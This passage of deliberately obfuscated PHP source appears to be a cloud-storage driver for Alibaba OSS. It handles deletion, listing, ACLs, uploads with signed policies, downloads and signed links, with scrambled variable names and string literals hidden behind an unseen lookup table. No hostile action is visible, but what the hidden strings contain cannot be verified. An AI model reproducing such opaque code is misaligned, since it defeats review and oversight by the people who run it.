delFile($´Ï¿íŞ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($´Ï¿íŞ)); } catch (OSS\Core\OssException $Ë±ÄÔî€) { $this->writeLog(__FUNCTION__ . $_SERVER[¶Ô„œ…¯][214] . $Ë±ÄÔî€->getMessage()); return !1; } return !0; } public function delFolder($¡Øö¢‰Œ) { $¯›÷«à¿ =& $_SERVER[¶Ô„œ…¯]; if (!$this->exist($¡Øö¢‰Œ)) { return !0; } $this->listItemCache = !1; $…èÃ½¨¢ = $this->fileList($¡Øö¢‰Œ); $this->listItemCache = !0; $¦ÆÄˆó¶ = trim($¡Øö¢‰Œ, $¯›÷«à¿[8]) . $¯›÷«à¿[8]; if (!empty($¡Øö¢‰Œ) && $¡Øö¢‰Œ !== $¯›÷«à¿[230] && !in_array($¦ÆÄˆó¶, $…èÃ½¨¢[$¯›÷«à¿[85]])) { $…èÃ½¨¢[$¯›÷«à¿[85]][] = $¦ÆÄˆó¶; } $»äğ–Ò = $this->delByBatch($…èÃ½¨¢[$¯›÷«à¿[86]]); if (!$»äğ–Ò) { return !1; } $»äğ–Ò = $this->delByBatch($…èÃ½¨¢[$¯›÷«à¿[85]]); if (!$»äğ–Ò) { return !1; } return $this->delFile($¦ÆÄˆó¶); } private function delByBatch($«ÄÂ²üÀ) { foreach (array_chunk($«ÄÂ²üÀ, 1000) as $†‡ÙñÃï) { try { $this->client->deleteObjects($this->bucket, $†‡ÙñÃï); } catch (OSS\Core\OssException $ùÆ›İÍ†) { $this->writeLog(__FUNCTION__ . $_SERVER[¶Ô„œ…¯][214] . $ùÆ›İÍ†->getMessage()); return !1; } } return !0; } public function rename($ıÄ¬ıš, $ˆ–§úÀÊ) { return $this->renameObject($ıÄ¬ıš, $ˆ–§úÀÊ); } private function fileInfo($Ûõíˆ¬–, $‹ƒ½µ¦ = false, $¸ıÜ¢Ò = array()) { $ƒÉ„ªÔ =& $_SERVER[¶Ô„œ…¯]; $¶ÃÏÈ±‚ = array($ƒÉ„ªÔ[32] => $this->pathThis($Ûõíˆ¬–), $ƒÉ„ªÔ[87] => $this->getPathOuter($Ûõíˆ¬–), $ƒÉ„ªÔ[33] => $ƒÉ„ªÔ[232], $ƒÉ„ªÔ[79] => isset($¸ıÜ¢Ò[$ƒÉ„ªÔ[79]]) ? $¸ıÜ¢Ò[$ƒÉ„ªÔ[79]] : 0, $ƒÉ„ªÔ[169] => $this->ext($Ûõíˆ¬–)); if ($‹ƒ½µ¦) { return $¶ÃÏÈ±‚; } $¶ÃÏÈ±‚[$ƒÉ„ªÔ[233]] = $¶ÃÏÈ±‚[$ƒÉ„ªÔ[88]] = 0; $¶ÃÏÈ±‚[$ƒÉ„ªÔ[234]] = $¶ÃÏÈ±‚[$ƒÉ„ªÔ[235]] = !0; if (empty($¸ıÜ¢Ò)) { $îÜÆ­ùŸ = $this->objectMeta($Ûõíˆ¬–); if (!$îÜÆ­ùŸ) { return $¶ÃÏÈ±‚; } $¸ıÜ¢Ò = array($ƒÉ„ªÔ[88] => strtotime($îÜÆ­ùŸ[$ƒÉ„ªÔ[1488]]), $ƒÉ„ªÔ[79] => $îÜÆ­ùŸ[$ƒÉ„ªÔ[1487]] + 0, $ƒÉ„ªÔ[1486] => $îÜÆ­ùŸ[$ƒÉ„ªÔ[1486]]); } if (isset($¸ıÜ¢Ò[$ƒÉ„ªÔ[1486]]) && $¸ıÜ¢Ò[$ƒÉ„ªÔ[1486]]) { $¶ÃÏÈ±‚[$ƒÉ„ªÔ[237]] = trim($¸ıÜ¢Ò[$ƒÉ„ªÔ[1486]], $ƒÉ„ªÔ[121]); } if (isset($¸ıÜ¢Ò[$ƒÉ„ªÔ[79]])) { $¶ÃÏÈ±‚[$ƒÉ„ªÔ[79]] = $¸ıÜ¢Ò[$ƒÉ„ªÔ[79]]; } if (isset($¸ıÜ¢Ò[$ƒÉ„ªÔ[88]])) { $¶ÃÏÈ±‚[$ƒÉ„ªÔ[88]] = $¸ıÜ¢Ò[$ƒÉ„ªÔ[88]]; } if (isset($¸ıÜ¢Ò[$ƒÉ„ªÔ[206]]) && !trim($¶ÃÏÈ±‚[$ƒÉ„ªÔ[88]])) { $¶ÃÏÈ±‚[$ƒÉ„ªÔ[88]] = $¸ıÜ¢Ò[$ƒÉ„ªÔ[206]]; } return $¶ÃÏÈ±‚; } private function folderInfo($¾ú‘ ÕŸ, $‘á­Ğñ = false, $“òà©¢ = array()) { $ ›úÄÍÅ =& $_SERVER[¶Ô„œ…¯]; $á„Ñœ®„ = array($ ›úÄÍÅ[32] => $this->pathThis($¾ú‘ ÕŸ), $ ›úÄÍÅ[87] => $this->getPathOuter($ ›úÄÍÅ[8] . $¾ú‘ ÕŸ), $ ›úÄÍÅ[33] => $ ›úÄÍÅ[78]); if ($‘á­Ğñ) { return $á„Ñœ®„; } $á„Ñœ®„[$ ›úÄÍÅ[233]] = $á„Ñœ®„[$ ›úÄÍÅ[88]] = 0; $á„Ñœ®„[$ ›úÄÍÅ[234]] = $á„Ñœ®„[$ ›úÄÍÅ[235]] = !0; if (empty($“òà©¢)) { $¾ú‘ ÕŸ = rtrim($¾ú‘ ÕŸ, $ ›úÄÍÅ[8]) . $ ›úÄÍÅ[8]; $éò©¼• = $this->objectMeta($¾ú‘ ÕŸ); if (!$éò©¼•) { return $á„Ñœ®„; } $“òà©¢ = array($ ›úÄÍÅ[233] => $éò©¼•[$ ›úÄÍÅ[577]][$ ›úÄÍÅ[1491]], $ ›úÄÍÅ[88] => strtotime($éò©¼•[$ ›úÄÍÅ[1488]])); } if (isset($“òà©¢[$ ›úÄÍÅ[88]])) { $á„Ñœ®„[$ ›úÄÍÅ[88]] = $“òà©¢[$ ›úÄÍÅ[88]]; } if (isset($“òà©¢[$ ›úÄÍÅ[233]])) { $á„Ñœ®„[$ ›úÄÍÅ[233]] = $“òà©¢[$ ›úÄÍÅ[233]]; } return $á„Ñœ®„; } public function listPath($µ¯âÁ®İ, $†¹ˆÔáÙ = false) { $ĞÁÚ–ê¾ =& $_SERVER[¶Ô„œ…¯]; $³´°¿î = $this->fileList($µ¯âÁ®İ, $ĞÁÚ–ê¾[8], !0); foreach ($³´°¿î[$ĞÁÚ–ê¾[85]] as $ŒëÀ’ùü => $®¸ëí‰´) { $³´°¿î[$ĞÁÚ–ê¾[85]][$ŒëÀ’ùü] = $this->folderInfo($®¸ëí‰´, $†¹ˆÔáÙ, $®¸ëí‰´); } foreach ($³´°¿î[$ĞÁÚ–ê¾[86]] as $ŒëÀ’ùü => $®¸ëí‰´) { $³´°¿î[$ĞÁÚ–ê¾[86]][$ŒëÀ’ùü] = $this->fileInfo($®¸ëí‰´[$ĞÁÚ–ê¾[32]], $†¹ˆÔáÙ, $®¸ëí‰´); } return $³´°¿î; } protected function infoChildren($îø®µº, &$ŠùØ…–±) { $îëÚ™“ =& $_SERVER[¶Ô„œ…¯]; $èÍğ¯« = $this->fileList($îø®µº, $îëÚ™“[12], !0); $ŠùØ…–±[$îëÚ™“[81]] += count($èÍğ¯«[$îëÚ™“[85]]); $ŠùØ…–±[$îëÚ™“[80]] += count($èÍğ¯«[$îëÚ™“[86]]); foreach ($èÍğ¯«[$îëÚ™“[86]] as $ÄÉ®Éç) { if (!$ÄÉ®Éç || !$ÄÉ®Éç[$îëÚ™“[79]]) { continue; } $ŠùØ…–±[$îëÚ™“[79]] += $ÄÉ®Éç[$îëÚ™“[79]]; } } public function has($ªŒºÀß³, $€­´ğß† = false, $¡óÄÅ÷ò = true) { $ÚÀêÜ‰ş =& $_SERVER[¶Ô„œ…¯]; $ªŒºÀß³ = trim($ªŒºÀß³, $ÚÀêÜ‰ş[8]); $›Æã«ú« = empty($ªŒºÀß³) && $ªŒºÀß³ !== $ÚÀêÜ‰ş[230] ? $ÚÀêÜ‰ş[12] : $ªŒºÀß³ . $ÚÀêÜ‰ş[8]; $ÙûÌ˜ƒ” = $ÚÀêÜ‰ş[12]; $Èá„â­ = 500; $†ŠíÁÖ² = $å™æåé = 0; while (!0) { check_abort(); $âëŒÀç¹ = array($ÚÀêÜ‰ş[1482] => $ÚÀêÜ‰ş[8], $ÚÀêÜ‰ş[1483] => $›Æã«ú«, $ÚÀêÜ‰ş[1484] => $Èá„â­, $ÚÀêÜ‰ş[1485] => $ÙûÌ˜ƒ”); try { $ñ•¦» à = $this->client->listObjects($this->bucket, $âëŒÀç¹); } catch (OSS\Core\OssException $ÁÄ†ù Å) { $this->writeLog(__FUNCTION__ . $ÚÀêÜ‰ş[214] . $ÁÄ†ù Å->getMessage()); break; } $ÙûÌ˜ƒ” = $ñ•¦» à->getNextMarker(); $± ¨‡÷Ó = $ñ•¦» à->getObjectList(); $üª‹€¸³ = $ñ•¦» à->getPrefixList(); if ($€­´ğß†) { if (count($± ¨‡÷Ó) > 1 || count($± ¨‡÷Ó) == 1 && $± ¨‡÷Ó[0]->getKey() != $›Æã«ú«) { $†ŠíÁÖ² += count($± ¨‡÷Ó) - 1; } if (!empty($üª‹€¸³)) { $å™æåé += count($üª‹€¸³); } if ($ÙûÌ˜ƒ” === $ÚÀêÜ‰ş[12]) { break; } continue; } if ($¡óÄÅ÷ò) { if (!empty($± ¨‡÷Ó)) { if (count($± ¨‡÷Ó) > 1 || $± ¨‡÷Ó[0]->getKey() != $›Æã«ú«) { return !0; } } } else { if (!empty($üª‹€¸³)) { return !0; } } if ($ÙûÌ˜ƒ” === $ÚÀêÜ‰ş[12]) { break; } } if ($€­´ğß†) { return array($ÚÀêÜ‰ş[241] => $†ŠíÁÖ², $ÚÀêÜ‰ş[242] => $å™æåé); } return !1; } public function listAll($İñÜú¸) { $ø•¹²„ =& $_SERVER[¶Ô„œ…¯]; $½•ÈÆ­š = $this->fileList($İñÜú¸, $ø•¹²„[12], !0); $°—‰ŞËŒ = array_to_keyvalue($½•ÈÆ­š[$ø•¹²„[86]], $ø•¹²„[32]); foreach ($½•ÈÆ­š[$ø•¹²„[85]] as $ÕƒÛ›¢‰) { if (is_string($ÕƒÛ›¢‰)) { $°—‰ŞËŒ[$ÕƒÛ›¢‰] = array($ø•¹²„[79] => 0); } } return $this->listAllFiles($İñÜú¸, $°—‰ŞËŒ); } public function canRead($¹º“•ß) { $‘öªÕ ¿ =& $_SERVER[¶Ô„œ…¯]; $¶Ïç“Ò = $this->pathAcl($¹º“•ß); return $¶Ïç“Ò == $‘öªÕ ¿[1492] || $¶Ïç“Ò == $‘öªÕ ¿[624] ? !0 : !1; } public function canWrite($ıíıê“) { $®òèÎ¨À = $this->pathAcl($ıíıê“); return $®òèÎ¨À == $_SERVER[¶Ô„œ…¯][624] ? !0 : !1; } public function pathAcl($…àÆ‚µ€) { $¦çÈöçâ =& $_SERVER[¶Ô„œ…¯]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $±ŸÕóëü = $this->client->getObjectAcl($this->bucket, $this->pathEncode($…àÆ‚µ€)); } catch (OSS\Core\OssException $ŠğÅ–üì) { $this->writeLog(__FUNCTION__ . $¦çÈöçâ[214] . $ŠğÅ–üì->getMessage()); return !1; } $ÎÅò¸ğ‰ = $±ŸÕóëü == $¦çÈöçâ[37] ? $this->bucketAcl : $±ŸÕóëü; if ($ÎÅò¸ğ‰ == $¦çÈöçâ[1493]) { return $¦çÈöçâ[1492]; } if ($ÎÅò¸ğ‰ == $¦çÈöçâ[1494]) { return $¦çÈöçâ[624]; } return $ÎÅò¸ğ‰; } private function chmodPath($êÁùº¶¡, $ú‰Ó¿Í¬ = '') { $ÇÊĞÖˆ =& $_SERVER[¶Ô„œ…¯]; $Ó¨Òæ· = empty($ú‰Ó¿Í¬) ? $ÇÊĞÖˆ[1494] : $ú‰Ó¿Í¬; $Ì‘Í¹ğ­ = array($ÇÊĞÖˆ[37], $ÇÊĞÖˆ[231], $ÇÊĞÖˆ[1493], $ÇÊĞÖˆ[1494]); if (!in_array($Ó¨Òæ·, $Ì‘Í¹ğ­)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($êÁùº¶¡), $Ó¨Òæ·); } catch (OSS\Core\OssException $ãÄÜ‘ ) { $this->writeLog(__FUNCTION__ . $ÇÊĞÖˆ[214] . $ãÄÜ‘ ->getMessage()); return !1; } return !0; } public function getContent($¯Ÿ¹ƒ–) { return $this->fileSubstr($¯Ÿ¹ƒ–, -1); } public function setContent($š–Õâü•, $¾â“ƒõ¹ = '') { $¬§°ÃŠ =& $_SERVER[¶Ô„œ…¯]; try { $¿Á¡Ò‚‘ = $this->trafficLimit($¬§°ÃŠ[1495]); $™Ò‡ü’ = $this->client->putObject($this->bucket, $this->pathEncode($š–Õâü•), $¾â“ƒõ¹, $¿Á¡Ò‚‘); } catch (OSS\Core\OssException $›±Îì‘Ó) { $this->writeLog(__FUNCTION__ . $¬§°ÃŠ[214] . $›±Îì‘Ó->getMessage()); return !1; } $…äÄÀ¸¨ = array($¬§°ÃŠ[1489] => trim($™Ò‡ü’[$¬§°ÃŠ[1486]], $¬§°ÃŠ[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($š–Õâü•))); $this->updateObjMeta($š–Õâü•, $…äÄÀ¸¨); return isset($™Ò‡ü’[$¬§°ÃŠ[1496]][$¬§°ÃŠ[296]]) ? !0 : !1; } private function updateObjMeta($“ŒÕ–ø¢, $ªÎüÄº¶) { $“ŒÕ–ø¢ = $this->pathEncode($“ŒÕ–ø¢); try { $Ù¤±©Ğ· = array(OSS\OssClient::OSS_HEADERS => $ªÎüÄº¶); $this->client->copyObject($this->bucket, $“ŒÕ–ø¢, $this->bucket, $“ŒÕ–ø¢, $Ù¤±©Ğ·); } catch (OSS\Core\OssException $İ»ƒî•Ö) { $this->writeLog(__FUNCTION__ . $_SERVER[¶Ô„œ…¯][214] . $İ»ƒî•Ö->getMessage()); return !1; } return !0; } public function upload($Ä‡¬Ùé™, $ã¡«ĞÖ, $˜¶­£À = false, $ùÊÑ¢İß = REPEAT_REPLACE) { $™Ó¦ËÎ« =& $_SERVER[¶Ô„œ…¯]; $ÃçÅë‚— = trim($Ä‡¬Ùé™, $™Ó¦ËÎ«[8]); $´“Û„ˆü = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($™Ó¦ËÎ«[1489] => @md5_file($ã¡«ĞÖ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ä‡¬Ùé™))); $´“Û„ˆü = $this->trafficLimit($™Ó¦ËÎ«[1495], $´“Û„ˆü); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ÃçÅë‚—), $ã¡«ĞÖ, $´“Û„ˆü); } catch (OSS\Core\OssException $Èì‹É—) { $this->writeLog(__FUNCTION__ . $™Ó¦ËÎ«[214] . $Èì‹É—->getMessage()); return !1; } return $this->getPathOuter($Ä‡¬Ùé™); } public function getHost() { $ğ‚üÄş’ =& $_SERVER[¶Ô„œ…¯]; $Ñî¢ï¿ = explode($ğ‚üÄş’[210], parent::getHost()); return $Ñî¢ï¿[0] . $ğ‚üÄş’[210] . $this->bucket . $ğ‚üÄş’[10] . $Ñî¢ï¿[1]; } public function uploadFormData($“ì©ó’, $ßùªö„Œ = 3600) { $…¥×³ôå =& $_SERVER[¶Ô„œ…¯]; if (!($‰­ßõ = $this->getHost())) { return !1; } $Âıº¸ß = $ßùªö„Œ; $×‚ºÃ¸ = date($…¥×³ôå[1497], time() + $Âıº¸ß); $ø¤„Á…Ü = new DateTime($×‚ºÃ¸); $‚©ºóŞ = $ø¤„Á…Ü->format(DateTime::ISO8601); $Ãß°Íİè = strpos($‚©ºóŞ, $…¥×³ôå[373]); $‚©ºóŞ = substr($‚©ºóŞ, 0, $Ãß°Íİè) . $…¥×³ôå[1498]; $İ•Ğñ = 1048576000 * 5; $¨¸«ƒÕ¹ = $this->pathFather($“ì©ó’); $¹òËáéô = array($…¥×³ôå[264] => $‚©ºóŞ, $…¥×³ôå[267] => array(array($…¥×³ôå[1499], 0, $İ•Ğñ), array($…¥×³ôå[269], $…¥×³ôå[270], $¨¸«ƒÕ¹))); $Ò½í“Š = base64_encode(json_encode($¹òËáéô)); $–ı…Ğ»¦ = base64_encode(hash_hmac($…¥×³ôå[1419], $Ò½í“Š, $this->secret, !0)); $¯øƒòäë = array($…¥×³ôå[1500] => $this->accessKey, $…¥×³ôå[279] => $Ò½í“Š, $…¥×³ôå[272] => $…¥×³ôå[263], $…¥×³ôå[1501] => $–ı…Ğ»¦, $…¥×³ôå[208] => $‰­ßõ); $¯øƒòäë = $this->trafficLimit($…¥×³ôå[1495], $¯øƒòäë, !0); return $¯øƒòäë; } public function uploadMultiData($àİû„©§, $°üÛŞ—É = 3600) { $¤é°Íš© =& $_SERVER[¶Ô„œ…¯]; if (!($ÀÄªöö = $this->getHost())) { return !1; } $ÆÎ…¦òõ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($àİû„©§)); return array($¤é°Íš©[283] => $ÆÎ…¦òõ, $¤é°Íš©[208] => $ÀÄªöö . $¤é°Íš©[8] . $this->pathEncode($àİû„©§), $¤é°Íš©[284] => gmdate($¤é°Íš©[1502]), $¤é°Íš©[97] => $àİû„©§); } public function uploadMultiAuth($ÊÅØà±, $Ã…€Õş£ = array()) { if (isset($Ã…€Õş£[$_SERVER[¶Ô„œ…¯][285]])) { return $this->uploadPartAuth($ÊÅØà±, $Ã…€Õş£); } return $this->uploadListAuth($ÊÅØà±, $Ã…€Õş£); } private function uploadPartAuth($Ø†¨İÆ‚, $·Ãşéá¬ = array()) { $¢àçÁùØ =& $_SERVER[¶Ô„œ…¯]; $§§˜ Ó = $·Ãşéá¬[$¢àçÁùØ[97]]; $ùº×öÌ¤ = $this->_getUploadAuth($§§˜ Ó, $·Ãşéá¬); $ú “ÌÊŒ = array($¢àçÁùØ[288] => $ùº×öÌ¤[$¢àçÁùØ[288]], $¢àçÁùØ[284] => $ùº×öÌ¤[$¢àçÁùØ[284]]); if (isset($ùº×öÌ¤[$¢àçÁùØ[1503]])) { $ú “ÌÊŒ[$¢àçÁùØ[1503]] = $ùº×öÌ¤[$¢àçÁùØ[1503]]; } return $ú “ÌÊŒ; } private function uploadListAuth($šÇ£¬Àø, $Õà¼·¹ğ = array()) { $²å†…Š =& $_SERVER[¶Ô„œ…¯]; $â¾çèÌ÷ = $Õà¼·¹ğ[$²å†…Š[97]]; $¦ ‰Æú’ = $Õà¼·¹ğ[$²å†…Š[283]]; $Ö£¯º«Ö = $this->client->listParts($this->bucket, $this->pathEncode($â¾çèÌ÷), $¦ ‰Æú’); $·»Ûç¶Õ = $Ö£¯º«Ö->getListPart(); $Ù÷‡Ó…ü = array(); foreach ($·»Ûç¶Õ as $¤Çæ¤Ä®) { $Ù÷‡Ó…ü[] = array($²å†…Š[299] => $¤Çæ¤Ä®->getPartNumber(), $²å†…Š[300] => trim($¤Çæ¤Ä®->getETag(), $²å†…Š[121])); } if (!$Ù÷‡Ó…ü) { return !1; } $¶»ÜŠÇ = $this->_getUploadAuth($â¾çèÌ÷, $Õà¼·¹ğ); return array($²å†…Š[288] => $¶»ÜŠÇ[$²å†…Š[288]], $²å†…Š[284] => $¶»ÜŠÇ[$²å†…Š[284]], $²å†…Š[291] => $Ù÷‡Ó…ü); } private function _getUploadAuth($ÄÁçÅ˜°, $Õ²İô£„) { $…°¾ŸÈ‰ =& $_SERVER[¶Ô„œ…¯]; $”»Ùéå„ = gmdate($…°¾ŸÈ‰[1502]); $íÆÀØƒ = isset($Õ²İô£„[$…°¾ŸÈ‰[285]]) ? $…°¾ŸÈ‰[255] : $…°¾ŸÈ‰[290]; $¡ıÄÒ¯Ø = array_intersect_key($Õ²İô£„, array_flip(array($…°¾ŸÈ‰[285], $…°¾ŸÈ‰[283]))); ksort($¡ıÄÒ¯Ø); $æ§±¦ŠÙ = $¡ıÄÒ¯Ø ? $…°¾ŸÈ‰[76] . http_build_query($¡ıÄÒ¯Ø, null, $…°¾ŸÈ‰[286], PHP_QUERY_RFC3986) : $…°¾ŸÈ‰[12]; $è°È  = array($íÆÀØƒ, $…°¾ŸÈ‰[12], $…°¾ŸÈ‰[123], $”»Ùéå„, "\170\55\x6f\163\x73\55\144\141\x74\145\72{$”»Ùéå„}", $…°¾ŸÈ‰[8] . $this->bucket . $…°¾ŸÈ‰[8] . $ÄÁçÅ˜° . $æ§±¦ŠÙ); if (isset($Õ²İô£„[$…°¾ŸÈ‰[285]])) { $ÎşâÔÜ = $this->trafficLimit($…°¾ŸÈ‰[1495], array(), !0); if ($ÎşâÔÜ) { $ÄÁçÅ˜° = $…°¾ŸÈ‰[1503]; array_splice($è°È , 5, 0, $ÄÁçÅ˜° . $…°¾ŸÈ‰[4] . $ÎşâÔÜ[$ÄÁçÅ˜°]); } } $åï„Ïš§ = implode($…°¾ŸÈ‰[287], $è°È ); $Ù–Şå½Ü = base64_encode(hash_hmac($…°¾ŸÈ‰[1419], $åï„Ïš§, $this->secret, !0)); $¶ñâ ²ƒ = $…°¾ŸÈ‰[1472] . $this->accessKey . $…°¾ŸÈ‰[4] . $Ù–Şå½Ü; $‰‹ÂïŒÍ = array($…°¾ŸÈ‰[288] => $¶ñâ ²ƒ, $…°¾ŸÈ‰[284] => $”»Ùéå„); if (!empty($ÎşâÔÜ)) { $‰‹ÂïŒÍ = array_merge($‰‹ÂïŒÍ, $ÎşâÔÜ); } return $‰‹ÂïŒÍ; } public function download($œˆ…¬ã×, $ÓªÚ¾¨) { $ƒÚåíú =& $_SERVER[¶Ô„œ…¯]; if ($this->isFolder($œˆ…¬ã×)) { return !1; } try { $·Úùİç = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ÓªÚ¾¨); $·Úùİç = $this->trafficLimit($ƒÚåíú[112], $·Úùİç); $this->client->getObject($this->bucket, $this->pathEncode($œˆ…¬ã×), $·Úùİç); } catch (OSS\Core\OssException $°´È…) { $this->writeLog(__FUNCTION__ . $ƒÚåíú[214] . $°´È…->getMessage()); return !1; } return $ÓªÚ¾¨; } public function fileSubstr($©üÚÔ‹İ, $ğÁÕí = 0, $Ó¸í†¾à = false) { if ($ğÁÕí === -1) { $Š™ôÂ¾ã = array(); } else { if ($Ó¸í†¾à === !1) { $àîğì…Ø = $this->size($©üÚÔ‹İ); } else { $àîğì…Ø = $ğÁÕí + $Ó¸í†¾à - 1; } $Š™ôÂ¾ã = array(OSS\OssClient::OSS_RANGE => "{$ğÁÕí}\55{$àîğì…Ø}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($©üÚÔ‹İ), $Š™ôÂ¾ã); } catch (OSS\Core\OssException $ƒé¡Ø“È) { $this->writeLog(__FUNCTION__ . $_SERVER[¶Ô„œ…¯][214] . $ƒé¡Ø“È->getMessage()); think_exception($ƒé¡Ø“È->getMessage()); return !1; } } private function trafficLimit($ œŠˆú, $ÓÆøÙÊÂ = array(), $¿ç“£¼ = false) { $²¥´Åè =& $_SERVER[¶Ô„œ…¯]; if ($ œŠˆú == $²¥´Åè[1495] && $this->isUploadServer() || $ œŠˆú == $²¥´Åè[112] && $this->isFileOutServer()) { return $ÓÆøÙÊÂ; } $ÕÊ€ûš = floatval($GLOBALS[$²¥´Åè[6]][$²¥´Åè[92]][$²¥´Åè[110]][$ œŠˆú]) * 1024 * 1024 * 8; if (!$ÕÊ€ûš) { return $ÓÆøÙÊÂ; } $ÕÊ€ûš = $ÕÊ€ûš < 819200 ? 819200 : ($ÕÊ€ûš > 838860800 ? 838860800 : $ÕÊ€ûš); if ($¿ç“£¼) { $ÓÆøÙÊÂ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÕÊ€ûš); } else { if (!isset($ÓÆøÙÊÂ[OSS\OssClient::OSS_HEADERS])) { $ÓÆøÙÊÂ[OSS\OssClient::OSS_HEADERS] = array(); } $ÓÆøÙÊÂ[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÕÊ€ûš); } return $ÓÆøÙÊÂ; } public function link($Á¢¹è‰õ, $´¢‡Ô× = array()) { $ã¾ÄîÌ =& $_SERVER[¶Ô„œ…¯]; if (!$this->exist($Á¢¹è‰õ) || $this->isFolder($Á¢¹è‰õ)) { return !1; } try { $´¢‡Ô× = $this->trafficLimit($ã¾ÄîÌ[112], $´¢‡Ô×, !0); $¿ŒÂÓ¯ = $this->client->signUrl($this->bucket, $this->pathEncode($Á¢¹è‰õ), 3600 * 12, $ã¾ÄîÌ[1504], $´¢‡Ô×); return $this->getCdnLink($¿ŒÂÓ¯); } catch (OSS\Core\OssException $’½ÑŸÖ…) { $this->writeLog(__FUNCTION__ . $ã¾ÄîÌ[214] . $’½ÑŸÖ…->getMessage()); return !1; } } public function fileOut($É®°Èƒ, $Ô·¹ ¨Å = false, $ÖÕËª«Ê = false, $Û„£¶Ô¹ = '') { $›éˆØ´ =& $_SERVER[¶Ô„œ…¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($É®°Èƒ, $Ô·¹ ¨Å, $ÖÕËª«Ê, $Û„£¶Ô¹); } if (!$ÖÕËª«Ê) { $ÖÕËª«Ê = $this->pathThis($É®°Èƒ); } $ÖÕËª«Ê = rawurlencode($ÖÕËª«Ê); $ğ¨™µŸ© = get_file_mime(get_path_ext($ÖÕËª«Ê)); if ($ğ¨™µŸ© == $›éˆØ´[250]) { return parent::fileOut($É®°Èƒ, $Ô·¹ ¨Å, $ÖÕËª«Ê, $Û„£¶Ô¹); } $Ô·¹ ¨Å = $Ô·¹ ¨Å ? $›éˆØ´[1505] : $›éˆØ´[1506]; $ãÎ¿¶Öİ = array(OSS\OssClient::OSS_SUB_RESOURCE => $›éˆØ´[1507] . rawurlencode("{$Ô·¹ ¨Å}\73\146\151\154\x65\x6e\x61\x6d\x65\75{$ÖÕËª«Ê}")); $ãÎ¿¶Öİ[OSS\OssClient::OSS_SUB_RESOURCE] .= $›éˆØ´[1508] . rawurlencode($ğ¨™µŸ©); $»»É¼«º = $this->link($É®°Èƒ, $ãÎ¿¶Öİ); $this->fileOutLink($»»É¼«º); } public function fileOutServer($úñë¹úÜ, $Ö»Íç©ı = false, $şÆõ¡œ¾ = false, $¿ãÇ©íÃ = '') { parent::fileOut($úñë¹úÜ, $Ö»Íç©ı, $şÆõ¡œ¾, $¿ãÇ©íÃ); } public function fileOutImage($Îô›ïÂÊ, $Áˆú¶·© = 250) { if ($this->size($Îô›ïÂÊ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Îô›ïÂÊ, $Áˆú¶·©); } $¯Ëœ¦•ƒ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¶Ô„œ…¯][1469] . $Áˆú¶·©); $äˆ®¶Óã = $this->link($Îô›ïÂÊ, $¯Ëœ¦•ƒ); $this->fileOutLink($äˆ®¶Óã); } public function fileOutImageServer($À°×ğç, $ßÍ‘Ìõ = 250) { parent::fileOutImage($À°×ğç, $ßÍ‘Ìõ); } public function fileOutLink($ƒ…µüº) { $ºÛÊÃ¥ğ =& $_SERVER[¶Ô„œ…¯]; if (!$this->isCdnHost() && substr($ƒ…µüº, 0, 7) == $ºÛÊÃ¥ğ[218]) { $ƒ…µüº = $ºÛÊÃ¥ğ[219] . substr($ƒ…µüº, 7); } header($ºÛÊÃ¥ğ[175] . $ƒ…µüº); die; } public function hashMd5($Èï½’şú, $™ÖğÁû© = '') { $ÎÇ—±ß =& $_SERVER[¶Ô„œ…¯]; $½Ú¶ˆ‹Ğ = $this->_objectMeta($Èï½’şú); if (!$½Ú¶ˆ‹Ğ) { return $ÎÇ—±ß[12]; } if (!isset($½Ú¶ˆ‹Ğ[$ÎÇ—±ß[1489]]) && !empty($™ÖğÁû©)) { $¬° œÆ“ = $this->updateObjMeta($Èï½’şú, array($ÎÇ—±ß[1489] => $™ÖğÁû©)); $½Ú¶ˆ‹Ğ[$ÎÇ—±ß[1489]] = $¬° œÆ“ ? $™ÖğÁû© : $ÎÇ—±ß[12]; } return isset($½Ú¶ˆ‹Ğ[$ÎÇ—±ß[1489]]) ? strtolower($½Ú¶ˆ‹Ğ[$ÎÇ—±ß[1489]]) : $ÎÇ—±ß[12]; } public function size($ºåô°Öî) { $ĞØ±Åç = $this->objectMeta($ºåô°Öî); return $ĞØ±Åç ? $ĞØ±Åç[$_SERVER[¶Ô„œ…¯][79]] : 0; } public function info($ÏÄÓíî) { if ($this->isFolder($ÏÄÓíî)) { return $this->folderInfo($ÏÄÓíî); } else { if ($this->isFile($ÏÄÓíî)) { return $this->fileInfo($ÏÄÓíî); } } return !1; } public function exist($³È¿£¡ğ) { return $this->isFile($³È¿£¡ğ) || $this->isFolder($³È¿£¡ğ); } public function isFile($©„ğÆ“) { return !$this->isFolder($©„ğÆ“) && $this->objectMeta($©„ğÆ“); } public function isFolder($Ì¯îç‡Ó) { return $this->cacheMethod($_SERVER[¶Ô„œ…¯][179], $Ì¯îç‡Ó); } protected function objectMeta($äì¬ÁÒå) { return $this->cacheMethod($_SERVER[¶Ô„œ…¯][181], $äì¬ÁÒå); } protected function _objectMeta($³ƒºòğå) { $‡®’¡¯ =& $_SERVER[¶Ô„œ…¯]; try { $Íç»Ùİ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($³ƒºòğå)); } catch (OSS\Core\OssException $ëƒ¬±Ø‘) { $this->writeLog(__FUNCTION__ . $‡®’¡¯[214] . $ëƒ¬±Ø‘->getMessage()); $Íç»Ùİ = !1; } if ($Íç»Ùİ) { $Íç»Ùİ[$‡®’¡¯[79]] = intval($Íç»Ùİ[$‡®’¡¯[1487]]); } return $Íç»Ùİ; } protected function _isFolder($Ï£ ®ô) { 